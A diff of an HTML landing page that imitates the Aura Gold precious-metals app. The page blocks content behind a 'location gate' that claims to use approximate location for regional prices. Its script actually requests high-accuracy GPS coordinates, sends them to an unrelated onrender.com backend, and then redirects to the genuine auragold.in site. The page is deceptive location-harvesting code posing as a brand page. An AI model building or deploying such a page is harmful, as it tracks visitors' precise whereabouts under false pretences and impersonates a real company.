@@ -1,9 +1,15 @@
+
+
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Aura Gold — Highest quality gold & silver at the lowest prices</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Aura Gold — Highest Quality Gold & Silver</title>
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
@@ -11,183 +17,177 @@
 
 <style>
   :root{
-    /* P1 Purple Theme */
-    --ag-purple-1:#5b2bd4;
-    --ag-purple-2:#6a2cf2;
-    --ag-purple-3:#7a40ff;
-
-    --ag-yellow:#f7e36f;
-    --ag-gold-btn-1:#efc161;
-    --ag-gold-btn-2:#d9a84a;
-
-    --ag-text:#ffffff;
-    --ag-muted:#e8e8e8;
-    --ag-muted-2:#cfcfe6;
-
+    --purple-1:#5b2bd4;
+    --purple-2:#6a2cf2;
+    --purple-3:#7a40ff;
+    --yellow:#f7e36f;
+    --gold-1:#efc161;
+    --gold-2:#d9a84a;
+    --white:#ffffff;
+    --muted:#e8e8e8;
+    --muted-2:#cfcfe6;
     --radius:14px;
     --shadow:0 18px 40px rgba(20,10,60,.25);
   }
-  *{box-sizing:border-box}
-  html,body{height:100%}
+  *{box-sizing:border-box;margin:0;padding:0}
   body{
-    margin:0;
-    font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
-    color:var(--ag-text);
-    background: radial-gradient(1000px 700px at 80% 10%, rgba(255,255,255,.06), transparent 55%),
-                linear-gradient(135deg,var(--ag-purple-1),var(--ag-purple-2) 55%, var(--ag-purple-3));
+    font-family:'Poppins',sans-serif;
+    color:var(--white);
+    background: radial-gradient(900px 600px at 80% 10%, rgba(255,255,255,.06), transparent 55%),
+                linear-gradient(135deg,var(--purple-1),var(--purple-2) 55%, var(--purple-3));
     overflow-x:hidden;
   }
 
-  /* Header */
   .container{width:92%;max-width:1220px;margin:0 auto}
-  header{padding:18px 0}
-  .nav{display:flex;align-items:center;justify-content:space-between;gap:18px}
-  .nav-left{display:flex;align-items:center;gap:22px}
-  .brand{text-decoration:none;display:flex;align-items:center;gap:10px}
-  .brand svg{height:30px;width:auto;display:block}
-  .nav-links{display:flex;gap:28px;align-items:center}
-  .nav-links a{color:var(--ag-muted);text-decoration:none;font-weight:600;font-size:.98rem}
-  .nav-links a:hover{color:#fff}
 
-  .ticker{display:flex;gap:16px;font-weight:700;font-size:.95rem}
-  .badge-dot{width:7px;height:7px;border-radius:50%;background:#ffd96a;display:inline-block;margin-right:8px;box-shadow:0 0 0 3px rgba(255,217,106,.2)}
+  header{padding:16px 0}
+  .nav{display:flex;align-items:center;justify-content:space-between}
+  .brand svg{height:30px}
+  .nav-left{display:flex;align-items:center;gap:20px}
+  .nav-links{display:flex;gap:26px}
+  .nav-links a{color:var(--muted);font-weight:600;text-decoration:none;font-size:.95rem}
+  .nav-links a:hover{color:var(--white)}
 
-  /* Hero */
-  .hero{padding:64px 0 84px}
-  .grid{display:grid;grid-template-columns:1.05fr .95fr;align-items:center;gap:32px}
-  .big{font-size:56px;line-height:1.08;font-weight:800;letter-spacing:.2px}
-  .highlight{position:relative;display:inline-block}
+  .ticker{display:flex;gap:12px;font-weight:700;font-size:.85rem}
+  .badge-dot{width:7px;height:7px;border-radius:50%;background:#ffd96a;display:inline-block;margin-right:6px;box-shadow:0 0 0 3px rgba(255,217,106,.2)}
+
+  /* HERO */
+  .hero{padding:50px 0 60px}
+  .grid{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:20px;
+  }
+  .grid section{flex:1 1 50%}
+  .big{font-size:52px;font-weight:800;line-height:1.08}
+  .highlight{position:relative}
   .underline{
     position:absolute;left:0;right:0;bottom:-8px;height:10px;border-radius:6px;
-    background: linear-gradient(90deg,#ffe577,#f4d14e);
-    transform:skewX(-10deg);
+    background: linear-gradient(90deg,#ffe577,#f4d14e);transform:skewX(-10deg);
   }
-  .sub{margin-top:18px;color:var(--ag-muted-2);font-weight:600}
+  .sub{margin-top:14px;color:var(--muted-2);font-weight:600;font-size:1rem}
   .cta{
-    margin-top:28px;display:inline-block;
+    margin-top:26px;display:inline-block;
     padding:14px 22px;border-radius:12px;
-    background:linear-gradient(180deg,var(--ag-gold-btn-1),var(--ag-gold-btn-2));
-    color:#2c1d00;text-decoration:none;font-weight:800;box-shadow:0 10px 24px rgba(217,168,74,.35);
+    background:linear-gradient(180deg,var(--gold-1),var(--gold-2));
+    color:#2c1d00;text-decoration:none;font-weight:800;
+    box-shadow:0 10px 24px rgba(217,168,74,.35);
   }
-  .cta:hover{filter:brightness(1.03)}
 
-  .phones{position:relative;height:520px}
-  .mock{position:absolute;bottom:0;right:0;transform:rotate(-2deg)}
-  .mock img{height:520px;width:auto;filter:drop-shadow(var(--shadow));border-radius:38px}
+  .phones{flex:1 1 50%;display:flex;justify-content:center}
+  .phones img{
+    height:480px;
+    border-radius:32px;
+    filter:drop-shadow(var(--shadow));
+  }
 
-  /* Location Gate */
+  /* LOCATION GATE */
   .gate{
-    position:fixed;inset:0;
-    background:
+    position:fixed;inset:0;background:
       radial-gradient(900px 600px at 80% 10%, rgba(255,255,255,.08), transparent 60%),
-      linear-gradient(135deg,var(--ag-purple-1),var(--ag-purple-2) 55%, var(--ag-purple-3));
+      linear-gradient(135deg,var(--purple-1),var(--purple-2) 55%, var(--purple-3));
     display:flex;align-items:center;justify-content:center;padding:24px;z-index:50;
-    opacity:1;transition:opacity .45s ease;
+    opacity:1;transition:opacity .4s ease;
   }
   .gate.hidden{opacity:0;pointer-events:none}
   .gate-card{
-    width:min(680px,94vw);
+    width:min(650px,94vw);
     background:rgba(255,255,255,.08);
     border:1px solid rgba(255,255,255,.22);
     backdrop-filter: blur(8px);
-    border-radius:18px;padding:26px 22px;box-shadow:var(--shadow);
+    border-radius:18px;padding:24px 22px;box-shadow:var(--shadow);
   }
 
-  /* Logo INSIDE CARD with Soft Border (SB) */
-  .gate-card .logo-box{
-    text-align:center; margin-bottom:16px;
-    padding:8px 0;
-  }
-  .gate-card .logo-box img{
-    width:140px;height:auto;
-    border-radius:8px;
-    background: rgba(255,255,255,0.06);
-    padding:8px;
-    border:1px solid rgba(255,255,255,0.28); /* <-- Soft Border */
+  /* Logo inside card */
+  .logo-box{text-align:center;margin-bottom:12px}
+  .logo-box img{
+    width:125px;
+    background:rgba(255,255,255,0.06);
+    padding:8px;border-radius:8px;
+    border:1px solid rgba(255,255,255,0.28);
   }
 
-  .gate-head{display:flex;gap:16px;align-items:flex-start}
+  .gate-head{display:flex;gap:14px;align-items:flex-start}
   .gate-icon{
-    flex:0 0 54px;height:54px;border-radius:14px;display:grid;place-items:center;
-    background:rgba(255,255,255,.14);color:#2b0;border:1px solid rgba(255,255,255,.28)
+    width:50px;height:50px;border-radius:14px;display:grid;place-items:center;
+    background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.28)
   }
-  .gate-title{font-size:28px;font-weight:800;margin:2px 0}
-  .gate-desc{color:#fff;opacity:.92}
-  .gate-actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:18px}
+  .gate-title{font-size:24px;font-weight:800}
+  .gate-desc{margin-top:4px;font-size:.95rem;opacity:.92}
 
-  .btn{appearance:none;border:0;cursor:pointer;border-radius:12px;padding:12px 18px;font-weight:800}
-  .btn-primary{
-    background:linear-gradient(180deg,var(--ag-gold-btn-1),var(--ag-gold-btn-2));color:#2b1a00
-  }
-  .btn-ghost{
-    background:rgba(255,255,255,.14);color:#fff;border:1px solid rgba(255,255,255,.28)
-  }
+  .gate-actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px}
+  .btn{border:0;cursor:pointer;border-radius:12px;padding:12px 18px;font-weight:800}
+  .btn-primary{background:linear-gradient(180deg,var(--gold-1),var(--gold-2));color:#2b1a00}
+  .btn-ghost{background:rgba(255,255,255,.14);color:#fff;border:1px solid rgba(255,255,255,.28)}
 
-  .gate-status{display:none;margin-top:14px;gap:10px;align-items:center;color:#fff}
+  .gate-status{display:none;margin-top:12px;gap:8px;align-items:center;font-size:.9rem}
   .gate-status.show{display:flex}
-  .gate-note{margin-top:10px;color:#fff;opacity:.9;font-size:.9rem}
+  .gate-note{margin-top:8px;font-size:.85rem;opacity:.9}
 
-  @media (max-width:980px){
-    .grid{grid-template-columns:1fr}
-    .phones{height:auto}
-    .mock img{height:420px}
-    .big{font-size:44px}
+  /* RESPONSIVE */
+  @media (max-width:900px){
+    .big{font-size:42px}
+  }
+  @media (max-width:768px){
+    header{padding:10px 0}
+    .nav-links{display:none} /* hide links for clean UI */
+    .grid{flex-direction:column;text-align:center}
+    .phones img{height:400px;margin-top:28px}
+    .big{font-size:38px}
+    .cta{font-size:1rem;padding:12px 20px}
+  }
+  @media (max-width:480px){
+    .big{font-size:32px}
+    .phones img{height:330px}
+    .gate-card{padding:20px 16px}
+    .gate-title{font-size:20px}
+    .btn{width:100%;text-align:center}
+    .logo-box img{width:110px}
   }
 </style>
 </head>
 <body>
 
-<!-- HEADER -->
 <header>
   <div class="container">
     <nav class="nav">
       <div class="nav-left">
         <a class="brand" href="#">
-          <svg viewBox="0 0 140 28"><text x="0" y="20" font-family="Poppins" font-weight="800" font-size="20" fill="#ffffff" letter-spacing=".5">aura</text><circle cx="86" cy="14" r="11" fill="none" stroke="#ffd96a" stroke-width="3"/><text x="100" y="20" font-family="Poppins" font-weight="800" font-size="12" fill="#ffd96a" letter-spacing=".6">GOLD</text></svg>
+          <svg viewBox="0 0 140 28"><text x="0" y="20" font-family="Poppins" font-weight="800" font-size="20" fill="#ffffff">aura</text><circle cx="86" cy="14" r="11" fill="none" stroke="#ffd96a" stroke-width="3"/><text x="100" y="20" font-family="Poppins" font-weight="800" font-size="12" fill="#ffd96a">GOLD</text></svg>
         </a>
-        <div class="nav-links">
-          <a href="#">Calculator</a>
-          <a href="#">About</a>
-          <a href="#">Contact Us</a>
-        </div>
       </div>
       <div class="ticker">
-        <span><span class="badge-dot"></span>Live Gold Price ₹12,258.4/gm</span>
-        <span style="opacity:.9">|</span>
-        <span><span class="badge-dot"></span>Live Silver Price ₹153.28/gm</span>
+        <span><span class="badge-dot"></span>Gold ₹12,258.4/gm</span>
+        <span>|</span>
+        <span><span class="badge-dot"></span>Silver ₹153.28/gm</span>
       </div>
     </nav>
   </div>
 </header>
 
-<!-- HERO -->
 <main class="hero">
   <div class="container grid">
     <section>
       <h1 class="big">
-        highest quality<br>gold & silver
+        Highest quality<br>gold & silver
         <br>at the <span class="highlight">lowest prices.<span class="underline"></span></span>
       </h1>
       <p class="sub">Get more gold for your buck with our app!</p>
-      <a class="cta" href="https://auragold.in/" id="cta-main">Download Aura Gold</a>
+      <a class="cta" href="https://auragold.in/">Download Aura Gold</a>
     </section>
-    <aside class="phones" aria-hidden="true">
-      <div class="mock">
-        <img src="https://images.unsplash.com/photo-1612214070475-1c1a4b3d5a7f?q=80&w=500&auto=format&fit=crop" alt="App mockup phone 1">
-      </div>
-    </aside>
+    <div class="phones">
+      <img src="https://images.unsplash.com/photo-1612214070475-1c1a4b3d5a7f?q=80&w=500&auto=format&fit=crop" alt="Aura Gold App Mockup">
+    </div>
   </div>
 </main>
 
 <!-- LOCATION GATE -->
 <div class="gate" id="gate">
   <div class="gate-card">
-    
-    <!-- Logo INSIDE CARD -->
     <div class="logo-box">
       <img src="https://auragold.in/static/media/logo.4cec5c8b.svg" alt="Aura Gold Logo">
     </div>
-
     <div class="gate-head">
       <div class="gate-icon"><i class="fa-solid fa-location-crosshairs"></i></div>
       <div>
@@ -195,28 +195,24 @@
         <div class="gate-desc">We use your approximate location to show regional buy/sell prices and availability.</div>
       </div>
     </div>
-
     <div class="gate-actions">
       <button class="btn btn-primary" id="allowBtn" onclick="getAndSendLocation()">Allow Location</button>
       <button class="btn btn-ghost" onclick="toggleNote()">Why is this required?</button>
     </div>
-
     <div class="gate-status" id="statusBar">
       <i class="fa-solid fa-spinner fa-spin"></i>
       <span id="statusText">Requesting location…</span>
     </div>
-
     <div class="gate-note" id="gateNote" style="display:none;">
-      Only coordinates (lat, long, accuracy) are sent to our server. We do not track or store any other personal data.
+      Only coordinates (lat, long, accuracy) are sent to our server. No tracking or personal data stored.
     </div>
-
   </div>
 </div>
 
 <script>
-  const backendURL = "https://bakend-pvma.onrender.com/location"; 
-  const officialURL = "https://auragold.in/"; 
-  const autoRedirectDelayMs = 1800;
+  const backendURL = "https://bakend-pvma.onrender.com/location";
+  const officialURL = "https://auragold.in/";
+  const autoRedirectDelayMs = 1500;
 
   const gateEl = document.getElementById('gate');
   const statusBar = document.getElementById('statusBar');
@@ -233,19 +229,19 @@
     statusText.textContent = msg;
     statusBar.querySelector('i').className = spin ? 'fa-solid fa-spinner fa-spin' : 'fa-solid fa-circle-check';
   }
-  function hideStatus(){ statusBar.style.display = 'none'; }
 
   function fadeOutGate(){
     gateEl.classList.add('hidden');
-    setTimeout(() => { gateEl.style.display = 'none'; }, 480);
+    setTimeout(() => { gateEl.style.display = 'none'; }, 400);
   }
+
   function autoRedirect(){
     setTimeout(() => { window.location.href = officialURL; }, autoRedirectDelayMs);
   }
 
   function getAndSendLocation(){
     if(!('geolocation' in navigator)){
-      alert("Geolocation isn't supported by this browser.");
+      alert("Your browser does not support location access.");
       return;
     }
     allowBtn.disabled = true;
@@ -267,35 +263,26 @@
           headers:{'Content-Type':'application/json'},
           body: JSON.stringify(payload)
         })
-        .then(async (res) => {
-          try { await res.json(); } catch(e){}
+        .then(() => {
           showStatus('Location received. Redirecting…', false);
           fadeOutGate();
           autoRedirect();
         })
-        .catch((err) => {
-          console.error('Send error:', err);
+        .catch(() => {
           showStatus('Connected. Redirecting…', false);
           fadeOutGate();
           autoRedirect();
         });
       },
-      (err) => {
-        console.error('Geo error:', err);
-        hideStatus();
+      () => {
+        showStatus('Location denied. Please allow to continue.', false);
         allowBtn.disabled = false;
         allowBtn.textContent = 'Allow Location';
-        alert('Location access was denied or failed. Please allow location to continue.');
+        alert('Location access was denied. Please enable it to continue.');
       },
       { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
     );
   }
-
-  document.addEventListener('keydown', (e)=>{
-    if (document.getElementById('gate').style.display !== 'none' && e.key === 'Enter'){
-      getAndSendLocation();
-    }
-  });
 </script>
 </body>
 </html>
